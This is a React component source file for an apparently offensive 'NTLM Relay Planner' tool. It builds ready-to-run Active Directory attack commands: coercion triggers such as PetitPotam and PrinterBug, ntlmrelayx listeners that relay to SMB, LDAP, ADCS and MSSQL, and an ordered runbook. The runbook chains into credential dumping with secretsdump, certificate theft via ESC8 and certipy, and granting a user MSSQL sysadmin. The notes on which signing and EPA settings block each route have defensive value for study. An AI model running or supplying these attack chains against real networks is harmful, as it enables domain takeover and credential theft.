import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CodeBlock,
  KVTable,
  OutputBlock,
  SectionTitle,
  Select,
  TextArea,
  TextInput,
} from '@/components/ui';
import { DEFAULT_CALLBACK_HOST, DEFAULT_TARGET, DEFAULT_TARGET_IP } from '@/tools/registry';

type Coercion = 'petitpotam' | 'printerbug' | 'dfscoerce' | 'shadowcoerce';
type Scheme = 'smb' | 'ldap' | 'ldaps' | 'http' | 'mssql';

const COERCIONS: Array<{
  value: Coercion;
  label: string;
  rpc: string;
  privs: string;
  fails: string;
  build: (domain: string, user: string, pass: string, listener: string, target: string) => string;
}> = [
  {
    value: 'petitpotam',
    label: 'PetitPotam — MS-EFSRPC',
    rpc: 'EfsRpcOpenFileRaw over the EFSRPC named pipe',
    privs: 'Anonymous on unpatched 2016/2019; any domain user once the hardening update is installed.',
    fails: 'Blocked outright when EFSRPC is disabled on the DC, and the anonymous path is gone after KB5005413-era patches.',
    build: (d, u, p, l, t) => `python3 PetitPotam.py -d ${d} -u ${u} -p '${p}' ${l} ${t}`,
  },
  {
    value: 'printerbug',
    label: 'PrinterBug — MS-RPRN',
    rpc: 'RpcRemoteFindFirstPrinterChangeNotificationEx (Spooler)',
    privs: 'Any authenticated domain user with a reachable Spooler service.',
    fails: 'Dies the moment Spooler is disabled on the DC — the single most common hardening step on modern builds.',
    build: (d, u, p, l, t) => `python3 printerbug.py ${d}/${u}:'${p}'@${t} ${l}`,
  },
  {
    value: 'dfscoerce',
    label: 'DFSCoerce — MS-DFSNM',
    rpc: 'NetDfsAddStdRoot / NetDfsRemoveStdRoot',
    privs: 'Any authenticated domain user; works where Spooler and EFSRPC are already closed.',
    fails: 'Needs the DFS Namespace service running on the target; a stopped service returns RPC_S_SERVER_UNAVAILABLE.',
    build: (d, u, p, l, t) => `python3 dfscoerce.py -d ${d} -u ${u} -p '${p}' ${l} ${t}`,
  },
  {
    value: 'shadowcoerce',
    label: 'ShadowCoerce — MS-FSRVP',
    rpc: 'IsPathShadowCopied (File Server Remote VSS Protocol)',
    privs: 'Any authenticated domain user against a host running the File Server VSS Agent.',
    fails: 'Only file servers answer at all — the RPC interface is absent on plain member workstations.',
    build: (d, u, p, l, t) => `python3 shadowcoerce.py -d ${d} -u ${u} -p '${p}' ${l} ${t}`,
  },
];

const SCHEMES: Array<{ value: Scheme; label: string }> = [
  { value: 'smb', label: 'SMB (445) — local admin / SAM' },
  { value: 'ldap', label: 'LDAP (389) — RBCD, shadow credentials' },
  { value: 'ldaps', label: 'LDAPS (636) — same, TLS-wrapped' },
  { value: 'http', label: 'HTTP — ADCS ESC8 certificate' },
  { value: 'mssql', label: 'MSSQL (1433) — sysadmin' },
];

interface Route {
  name: string;
  need: string;
  ok: boolean;
  why: string;
}

export default function NtlmRelayPlanner() {
  const [coercion, setCoercion] = useState<Coercion>('petitpotam');
  const [domain, setDomain] = useState(DEFAULT_TARGET);
  const [user, setUser] = useState('lowpriv');
  const [pass, setPass] = useState('Password123');
  const [listener, setListener] = useState(DEFAULT_CALLBACK_HOST);
  const [target, setTarget] = useState(DEFAULT_TARGET_IP);
  const [scheme, setScheme] = useState<Scheme>('smb');
  const [targets, setTargets] = useState(`${DEFAULT_TARGET_IP}\n203.0.113.11\nfiles01.example.com`);
  const [smb2, setSmb2] = useState(true);
  const [socks, setSocks] = useState(true);

  const [smbSigning, setSmbSigning] = useState(false);
  const [ldapSigning, setLdapSigning] = useState(false);
  const [ldapsEpa, setLdapsEpa] = useState(false);
  const [caEpa, setCaEpa] = useState(false);
  const [mssqlNtlm, setMssqlNtlm] = useState(true);

  const prim = COERCIONS.find((c) => c.value === coercion) ?? COERCIONS[0];
  const targetList = targets
    .split(/\r?\n/)
    .map((l) => l.trim())
    .filter(Boolean);
  const multi = targetList.length > 1;

  const trigger = useMemo(
    () => prim.build(domain.trim() || DEFAULT_TARGET, user.trim() || 'lowpriv', pass || 'Password123', listener || DEFAULT_CALLBACK_HOST, target || DEFAULT_TARGET_IP),
    [prim, domain, user, pass, listener, target],
  );

  const listenerTarget = useMemo(() => {
    const host = scheme === 'http' ? `http://${target || DEFAULT_TARGET_IP}/certsrv/certfnsh.asp` : `${scheme}://${target || DEFAULT_TARGET_IP}`;
    return host;
  }, [scheme, target]);

  const relayCommand = useMemo(() => {
    const parts = ['ntlmrelayx.py'];
    if (multi) parts.push('-tf targets.txt');
    else parts.push(`-t ${listenerTarget}`);
    if (smb2) parts.push('-smb2support');
    if (socks) parts.push('-socks');
    if (scheme === 'ldap' || scheme === 'ldaps') parts.push('--delegate-access');
    if (scheme === 'http') parts.push('--adcs --template DomainController');
    if (scheme === 'mssql') parts.push('-q "SELECT IS_SRVROLEMEMBER(\'sysadmin\')"');
    parts.push('-of relay.out');
    return parts.join(' ');
  }, [multi, listenerTarget, smb2, socks, scheme]);

  const routes = useMemo<Route[]>(
    () => [
      {
        name: 'SMB → local admin',
        need: 'SMB signing not required',
        ok: !smbSigning,
        why: smbSigning
          ? 'Signing is required, so the relayed session cannot be hijacked — SMB relay is dead on this target. Fall back to LDAP or HTTP.'
          : 'Signing is off, so a relayed NTLM session lands as the coerced machine account and admin tooling can run SAM/LSA dumps.',
      },
      {
        name: 'LDAP → RBCD / shadow credentials',
        need: 'LDAP signing not required',
        ok: !ldapSigning,
        why: ldapSigning
          ? 'LDAP signing is enforced, so a cleartext 389 relay is rejected. Try LDAPS: signing does not apply there, only channel binding does.'
          : 'Signing is off, so the relay can write msDS-AllowedToActOnBehalfOfOtherIdentity or msDS-KeyCredentialLink on any object the coerced account can modify.',
      },
      {
        name: 'LDAPS → RBCD (TLS)',
        need: 'EPA / channel binding not enforced',
        ok: !ldapsEpa,
        why: ldapsEpa
          ? 'Extended Protection is enforced on LDAPS, so the relayed authentication fails the channel-binding check even with signing off.'
          : 'EPA is off, so the TLS listener accepts a relayed NTLM handshake and the same LDAP writes work over 636.',
      },
      {
        name: 'HTTP → ADCS ESC8 certificate',
        need: 'CA web enrolment accepts NTLM without EPA',
        ok: !caEpa,
        why: caEpa
          ? 'EPA on the CA endpoint breaks the relay — the certificate request cannot complete without channel binding.'
          : 'The CA web endpoint accepts NTLM, so a coerced machine account yields a certificate for that machine — then PKINIT turns it into a TGT.',
      },
      {
        name: 'MSSQL → sysadmin',
        need: 'SQL logins accept NTLM',
        ok: mssqlNtlm,
        why: mssqlNtlm
          ? 'The instance accepts NTLM logins, so a relayed machine account can reach xp_dirtree or an impersonation path.'
          : 'NTLM logins are refused — only Kerberos or SQL auth is accepted, so there is nothing to relay into.',
      },
    ],
    [smbSigning, ldapSigning, ldapsEpa, caEpa, mssqlNtlm],
  );

  const surviving = routes.filter((r) => r.ok);

  const runbook = useMemo(() => {
    const lines: string[] = [];
    lines.push('# 0 · inventory — which targets will actually relay');
    lines.push(`nxc smb ${target || DEFAULT_TARGET_IP} --gen-relay-list relay.txt   # prints hosts with signing disabled`);
    lines.push(`nxc ldap ${target || DEFAULT_TARGET_IP} -u '${user || 'lowpriv'}' -p '${pass || 'Password123'}' -M ldap-checker`);
    lines.push('');
    lines.push('# 1 · free the ports — Responder must NOT be listening on 445/139/80');
    lines.push('sudo systemctl stop responder 2>/dev/null; sudo pkill -f Responder.py');
    lines.push('');
    lines.push('# 2 · start the listener');
    if (multi) {
      lines.push(`cat > targets.txt <<'EOF'`);
      lines.push(...targetList);
      lines.push('EOF');
    }
    lines.push(relayCommand);
    lines.push('');
    lines.push('# 3 · coerce, from a second shell');
    lines.push(trigger);
    lines.push('');
    if (socks) {
      lines.push('# 4 · reuse the authenticated sessions through the SOCKS proxy');
      lines.push('echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf');
      lines.push(`proxychains nxc smb ${target || DEFAULT_TARGET_IP} -u '' -p '' --shares`);
      lines.push('');
    }
    if (surviving.length === 0) {
      lines.push('# No route survives the current signing/TLS model — fix the target list before running this.');
    } else {
      lines.push('# 5 · escalation, in the order the routes survive');
      for (const r of surviving) {
        if (r.name.startsWith('SMB')) lines.push(`impacket-secretsdump -no-pass -k ${target || DEFAULT_TARGET_IP}`);
        if (r.name.startsWith('LDAP'))
          lines.push(`ntlmrelayx.py -t ${r.name.startsWith('LDAPS') ? 'ldaps' : 'ldap'}://${target || DEFAULT_TARGET_IP} --escalate-user '${user || 'lowpriv'}'`);
        if (r.name.startsWith('HTTP'))
          lines.push(`certipy auth -pfx dc01.pfx -dc-ip ${target || DEFAULT_TARGET_IP}   # PKINIT → TGT`);
        if (r.name.startsWith('MSSQL'))
          lines.push(`ntlmrelayx.py -t mssql://${target || DEFAULT_TARGET_IP} -q "EXEC sp_addsrvrolemember '${user || 'lowpriv'}', 'sysadmin'"`);
      }
    }
    return lines.join('\n');
  }, [target, user, pass, multi, targetList, relayCommand, trigger, socks, surviving]);

  return (
    <>
      <Card title="Coercion">
        <div className="grid gap-4 sm:grid-cols-2">
          <Select label="Primitive" value={coercion} onChange={setCoercion} options={COERCIONS.map((c) => ({ value: c.value, label: c.label }))} hint={prim.rpc} />
          <TextInput label="Target host" value={target} onChange={setTarget} mono placeholder={DEFAULT_TARGET_IP} hint="the host to coerce" />
          <TextInput label="Listener address" value={listener} onChange={setListener} mono placeholder={DEFAULT_CALLBACK_HOST} hint="attacker IP the target can reach" />
          <TextInput label="Domain" value={domain} onChange={setDomain} mono placeholder={DEFAULT_TARGET} />
          <TextInput label="Username" value={user} onChange={setUser} mono />
          <TextInput label="Password" value={pass} onChange={setPass} mono type="password" />
        </div>
        <div className="mt-4">
          <KVTable
            rows={[
              ['RPC abused', prim.rpc],
              ['Required privileges', prim.privs],
              ['When it fails', prim.fails],
            ]}
          />
        </div>
        <div className="mt-4">
          <CodeBlock code={trigger} label="Trigger" maxHeight={140} />
        </div>
      </Card>

      <Card title="Listener">
        <div className="grid gap-4 sm:grid-cols-2">
          <Select label="Relay protocol" value={scheme} onChange={setScheme} options={SCHEMES} hint={listenerTarget} />
          <div className="flex flex-col justify-center gap-2 pt-1">
            <Checkbox checked={smb2} onChange={setSmb2} label="SMB2 support" description="Required by every modern Windows host" />
            <Checkbox checked={socks} onChange={setSocks} label="SOCKS proxy" description="Keep sessions open for reuse instead of one-shot" />
          </div>
        </div>
        <div className="mt-4">
          <TextArea label="Target list" value={targets} onChange={setTargets} rows={4} hint={`${targetList.length} host(s) — more than one switches to -tf`} />
        </div>
        <div className="mt-4">
          <CodeBlock code={relayCommand} label="Listener command" maxHeight={140} />
        </div>
        <div className="mt-4">
          <CodeBlock
            code={`nxc smb 203.0.113.0/24 --gen-relay-list relay.txt\n# LDAP-side equivalent of the same filter\nGet-DomainComputer -Properties dnshostname | select -Expand dnshostname | Out-File targets.txt`}
            label="Building the target list"
            maxHeight={120}
          />
        </div>
      </Card>

      <Card title="Signing, channel binding and surviving routes">
        <div className="grid gap-3 sm:grid-cols-2">
          <Checkbox checked={smbSigning} onChange={setSmbSigning} label="SMB signing required" description="Blocks every SMB relay target" />
          <Checkbox checked={ldapSigning} onChange={setLdapSigning} label="LDAP signing required" description="Blocks cleartext LDAP relay" />
          <Checkbox checked={ldapsEpa} onChange={setLdapsEpa} label="LDAPS EPA enforced" description="Channel binding breaks TLS relay" />
          <Checkbox checked={caEpa} onChange={setCaEpa} label="ADCS endpoint EPA" description="Breaks ESC8 certificate relay" />
          <Checkbox checked={mssqlNtlm} onChange={setMssqlNtlm} label="MSSQL accepts NTLM" description="Only then is a SQL relay useful" />
        </div>

        <div className="mt-4 overflow-hidden rounded border border-[var(--card-border)]">
          <div className="grid grid-cols-[1.4fr_1fr_auto] gap-2 border-b border-[var(--card-border)] px-3 py-1.5 text-[11px] text-[var(--text-faint)]">
            <span>Route</span>
            <span>Requirement</span>
            <span className="text-right">Status</span>
          </div>
          {routes.map((r) => (
            <div key={r.name} className="border-b border-[var(--card-border)] px-3 py-2 last:border-b-0">
              <div className="grid grid-cols-[1.4fr_1fr_auto] items-baseline gap-2 text-[12.5px]">
                <span className="text-[var(--text)]">{r.name}</span>
                <span className="text-[var(--text-muted)]">{r.need}</span>
                <span className="text-right text-[11.5px] font-medium" style={{ color: r.ok ? 'var(--ok)' : 'var(--accent)' }}>
                  {r.ok ? 'survives' : 'blocked'}
                </span>
              </div>
              <p className="mt-1 mb-0 text-[11.5px] leading-snug text-[var(--text-faint)]">{r.why}</p>
            </div>
          ))}
        </div>
      </Card>

      <Card title="Ordered runbook">
        <SectionTitle right={<span className="text-[11px] text-[var(--text-faint)]">{surviving.length} of {routes.length} routes survive</span>}>
          Chain
        </SectionTitle>
        <OutputBlock value={runbook} rows={18} label="Runbook" />
        <div className="mt-4">
          <Callout tone={surviving.length ? 'info' : 'danger'} title={surviving.length ? 'Sequencing matters' : 'No viable route'}>
            {surviving.length
              ? 'Coercion fires once per target and the listener is single-threaded per protocol, so start the listener before the trigger and expect the session to appear within one SMB timeout. Signing is per-target, not per-domain — a signing-off member server is still a valid relay destination in a signing-on domain.'
              : 'Every route is closed by signing or EPA. Re-check the toggles against real output from nxc/ldap-checker rather than assuming; a single mis-set switch inverts this whole table.'}
          </Callout>
        </div>
      </Card>
    </>
  );
}
